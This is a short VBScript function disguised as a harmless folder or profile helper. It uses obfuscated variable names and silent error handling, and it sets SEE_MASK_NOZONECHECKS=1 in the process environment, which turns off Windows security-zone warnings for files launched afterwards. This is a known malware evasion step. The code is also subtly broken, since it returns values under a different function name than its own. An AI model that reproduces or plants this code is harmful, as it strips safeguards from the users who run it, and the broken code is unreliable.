' Sub ShowFolderInfo style helper
Function LoadProfileSegment70()
On Error Resume Next
  Dim strSection67,blnValid38,strSection13
  Set strSection67=CreateObject("WScript.Shell")
  blnValid38=strSection67.ExpandEnvironmentStrings("%TEMP%")
  strSection13=strSection67.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnValid38)>0 And Len(strSection13)>0 Then
    strSection67.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ReadCacheLine87=1
    Exit Function
  End If
  ReadCacheLine87=0
End Function

